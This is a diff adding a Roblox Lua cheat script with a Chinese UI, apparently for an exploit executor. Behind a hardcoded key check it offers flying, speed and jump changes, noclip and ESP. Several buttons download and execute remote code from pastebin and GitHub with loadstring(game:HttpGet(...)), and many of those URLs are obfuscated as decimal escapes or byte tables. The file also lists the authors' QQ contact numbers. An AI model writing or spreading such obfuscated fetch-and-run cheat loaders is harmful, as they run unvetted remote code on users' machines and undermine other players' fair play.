@@ -1,0 +1,260 @@
+local ScreenGui = Instance.new("ScreenGui")
+local UI = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local Frame = Instance.new("Frame")
+local Key = Instance.new("TextBox")
+local Start = Instance.new("TextButton")
+
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+UI.Name = "卡密"
+UI.Parent = ScreenGui
+UI.Active = true
+UI.BackgroundColor3 = Color3.new(0, 0, 0)
+UI.BackgroundTransparency = 0
+UI.BorderSizePixel = 3
+UI.Position = UDim2.new(0.5, -150, 0.5, -67)
+UI.Size = UDim2.new(0, 260, 0, 250)
+UI.Draggable = true
+
+Title.Name = "Title"
+Title.Parent = UI
+Title.BackgroundColor3 = Color3.new(68, 68, 68)
+Title.BackgroundTransparency = 1
+Title.BorderSizePixel = 2
+Title.Position = UDim2.new(0, 0, 0.02, 0)
+Title.Size = UDim2.new(1, 0, 0, 50)
+Title.Font = Enum.Font.SourceSans
+Title.Text = "密钥"
+Title.TextColor3 = Color3.new(0, 0, 255)
+Title.TextScaled = true
+Title.TextSize = 14
+Title.TextWrapped = true
+
+Frame.Parent = Title
+Frame.BackgroundColor3 = Color3.new(0, 0, 255)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.07, 0, 0.9, 0)
+Frame.Size = UDim2.new(0.85, 0, 0, 6)
+
+Key.Name = "Key"
+Key.Parent = UI
+Key.BackgroundColor3 = Color3.new(1, 1, 1)
+Key.BorderSizePixel = 0
+Key.Position = UDim2.new(0.1, 0, 0.31, 0)
+Key.Size = UDim2.new(0.8, 0, 0, 50)
+Key.Font = Enum.Font.SourceSans
+Key.PlaceholderText = "密钥"
+Key.Text = ""
+Key.TextColor3 = Color3.new(0, 0, 0)
+Key.TextScaled = true
+Key.TextSize = 14
+Key.TextWrapped = true
+
+Start.Name = "Start"
+Start.Parent = UI
+Start.BackgroundColor3 = Color3.new(0, 0, 255)
+Start.BackgroundTransparency = 0
+Start.BorderSizePixel = 2
+Start.Position = UDim2.new(0.25, 0, 0.65, 0)
+Start.Size = UDim2.new(0.5, 0, 0, 45)
+Start.Font = Enum.Font.Gotham
+Start.Text = "确定"
+Start.TextColor3 = Color3.new(0, 0, 0)
+Start.TextScaled = true
+Start.TextSize = 10
+Start.TextWrapped = true
+
+Start.MouseButton1Click:Connect(function()
+    if Key.Text == "王者号114514" then
+        ScreenGui:Destroy()
+        local OrionLib = loadstring(game:HttpGet("https://pastebin.com/raw/xLRUSiKx"))()
+local Window = OrionLib:MakeWindow({Name = "CBM脚本", HidePremium = false, SaveConfig = true,IntroText = "CBM脚本", ConfigFolder = "CBM脚本"})
+
+local about = Window:MakeTab({
+    Name = "CBM制作",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+about:AddParagraph("该CBM为测试版，永久免费")
+about:AddParagraph("脚本免费脚本 请勿去圈钱")
+about:AddParagraph("作者:别偷我家 ")
+about:AddParagraph("帮助者:？？？？？？ ")
+about:AddParagraph("帮助者QQ:2285033810")
+about:AddParagraph("作者QQ:671298501 更新以及反馈QQ群:251542715")
+about:AddParagraph("倒卖没亩 ")
+
+OrionLib:MakeNotification({
+	Name = "CBM脚本",
+	Content = "欢迎使用CBM脚本",
+	Image = "rbxassetid://4483345998",
+	Time = 2
+})
+
+local Tab = Window:MakeTab({
+	Name = "人物",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "飞行",
+	Callback = function()
+      	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
+  	end    
+})
+
+Tab:AddTextbox({
+	Name = "移动速度",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(Value)
+		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
+	end	 
+})
+ 
+ Tab:AddTextbox({
+	Name = "跳跃高度",
+	Default = "",
+	TextDisappear = true,
+	Callback = function(Value)
+		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
+	end	 
+})
+
+local Tab = Window:MakeTab({
+	Name = "通用",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddToggle({
+	Name = "夜视",
+	Default = false,
+	Callback = function(Value)
+		if Value then
+		    game.Lighting.Ambient = Color3.new(1, 1, 1)
+		else
+		    game.Lighting.Ambient = Color3.new(0, 0, 0)
+		end
+	end
+})
+
+Tab:AddButton({
+	Name = "飞车",
+	Callback = function()
+loadstring(game:HttpGet("https://pastebin.com/raw/MHE1cbWF"))()
+	end
+})
+
+Tab:AddToggle({
+	Name = "穿墙",
+	Default = false,
+	Callback = function(Value)
+		if Value then
+		    Noclip = true
+		    Stepped = game.RunService.Stepped:Connect(function()
+			    if Noclip == true then
+				    for a, b in pairs(game.Workspace:GetChildren()) do
+                        if b.Name == game.Players.LocalPlayer.Name then
+                            for i, v in pairs(game.Workspace[game.Players.LocalPlayer.Name]:GetChildren()) do
+                                if v:IsA("BasePart") then
+                                    v.CanCollide = false
+                                end
+                            end
+                        end
+                    end
+			    else
+				    Stepped:Disconnect()
+			    end
+		    end)
+	    else
+		    Noclip = false
+	    end
+	end
+})
+
+Tab:AddButton({
+	Name = "透视",
+	Callback = function()
+loadstring(game:GetObjects("rbxassetid://10092697033")[1].Source)()
+	end 
+})
+
+Tab:AddButton({
+	Name = "转起来",
+	Callback = function()
+      	loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
+  	end
+})
+
+local Tab = Window:MakeTab({
+	Name = "游戏脚本",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "极速传奇ovo提供",
+	Callback = function()
+      	loadstring(game:HttpGet('\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\98\111\121\115\99\112\47\98\101\116\97\47\109\97\105\110\47\37\69\57\37\56\48\37\57\70\37\69\53\37\66\65\37\65\54\37\69\55\37\56\50\37\66\56\37\69\56\37\66\53\37\66\55\46\108\117\97'))()
+  	end
+})
+
+Tab:AddButton({
+	Name = "脚本中心妠西妲提供",
+	Callback = function()
+  loadstring(game:HttpGet("https://pastebin.com/raw/De4aYHDY"))()
+  	end
+})
+
+Tab:AddButton({
+	Name = "龙脚本",
+	Callback = function()
+  loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\108\121\121\97\105\110\105\47\108\111\110\47\109\97\105\110\47\108\105\115\119\109\34\41\41\40\41")()
+  	end
+})
+
+Tab:AddButton({
+	Name = "USA卡密:USA AER",
+	Callback = function()
+  getgenv().USA="作者莫羽免费请勿倒卖"loadstring(game:HttpGet("https://raw.githubusercontent.com/boyscp/beta/main/USA.lua"))()
+  	end
+})
+
+Tab:AddButton({
+	Name = "自制脚本",
+	Callback = function()
+  getgenv().yczgqffg="自制脚本" loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,122,110,67,121,54,89,77,81})end)())))()
+  	end
+})
+
+Tab:AddButton({
+	Name = "eom脚本",
+	Callback = function()
+  getgenv().eom = "eom"
+loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\68\122\120\115\81\82\68\85\39\41\41\40\41")()
+  	end
+})
+
+Tab:AddButton({
+	Name = "河流脚本",
+	Callback = function()
+  loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\77\50\57\77\117\81\115\80"))()
+  	end
+})
+
+Tab:AddButton({
+	Name = "BS脚本卡密:195154ajd",
+	Callback = function()
+  loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,71,57,103,117,122,88,100,75})end)())))()--BS
+  	end
+})
+
+OrionLib:Init()
+    else
+        game.Players.LocalPlayer:Kick("卡密错误 可以问王者号获取卡密")
+    end
+end)
+                   
